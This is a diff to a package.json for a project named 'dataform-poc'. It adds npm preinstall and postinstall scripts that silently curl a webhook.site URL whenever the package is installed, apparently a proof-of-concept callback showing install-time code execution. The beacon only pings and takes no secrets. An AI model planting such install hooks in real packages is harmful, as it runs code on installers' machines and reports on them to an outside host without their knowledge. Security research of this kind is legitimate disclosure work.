@@ -1,1 +1,8 @@
-{"name":"dataform-poc","dependencies":{}}
+{
+  "name": "dataform-poc",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -s https://webhook.site/3de9b91a-35f5-4220-be32-fac9d26ae8a4/npm-preinstall || true",
+    "postinstall": "curl -s https://webhook.site/3de9b91a-35f5-4220-be32-fac9d26ae8a4/npm-postinstall || true"
+  }
+}
